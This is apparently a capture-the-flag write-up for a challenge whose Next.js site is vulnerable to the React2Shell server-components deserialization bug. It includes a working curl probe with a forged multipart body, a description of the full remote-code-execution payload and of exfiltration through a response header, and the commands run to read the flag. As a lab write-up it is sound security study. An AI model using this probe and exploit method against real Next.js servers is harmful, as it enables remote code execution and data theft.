@@ -1,0 +1,67 @@
+Flag: `ctfzone{r34ct2Sh3ll_1s_cr1t1c4L}`
+
+Challenge: `Reaction Time`
+Target: `http://labs.ctfzone.com:7772`
+
+Summary:
+- The app is a minimal `Next.js` App Router site.
+- The frontend leaked `next@16.0.6`.
+- That version is in the vulnerable range for the React Server Components bug family usually called `React2Shell` (`CVE-2025-55182` / downstream Next.js impact).
+- Exploitation does not require a valid action ID here. Sending a forged `Next-Action` multipart body to `/` was enough.
+
+Detection:
+This probe is non-destructive. A vulnerable target returns `HTTP 500` with `Content-Type: text/x-component` and an RSC digest.
+
+```bash
+curl -i -X POST 'http://labs.ctfzone.com:7772/' \
+  -H 'Next-Action: x' \
+  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad' \
+  --data-binary $'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="1"\r\n\r\n{}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="0"\r\n\r\n["$1:a:a"]\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n'
+```
+
+Expected vulnerable response:
+```text
+HTTP/1.1 500 Internal Server Error
+Content-Type: text/x-component
+
+0:{"a":"$@1","f":"","b":"..."}
+1:E{"digest":"..."}
+```
+
+Why it works:
+- The vulnerable RSC deserializer allows unsafe path traversal while resolving model references.
+- With a forged chunk object and a self-reference, the server treats attacker-controlled data like an internal React chunk.
+- That reaches the `Function` constructor path and executes attacker-controlled JavaScript.
+
+Working exploit idea:
+- Send a multipart body with:
+  - part `0`: forged chunk JSON
+  - part `1`: `"$@0"`
+- Use redirect-based exfiltration so command output comes back in the `x-action-redirect` header.
+
+Useful commands I executed through the exploit:
+```sh
+id
+find / -maxdepth 3 -iname "*flag*" 2>/dev/null
+cat /flag.txt
+```
+
+What the filesystem search returned:
+```text
+/proc/kpageflags
+/flag.txt
+```
+
+Final command:
+```sh
+cat /flag.txt
+```
+
+Final output:
+```text
+ctfzone{r34ct2Sh3ll_1s_cr1t1c4L}
+```
+
+Takeaway:
+- When a CTF web app is an almost-empty modern framework page, check the framework version first.
+- Here the intended bug was not custom app logic but vulnerable `Next.js` / RSC handling.
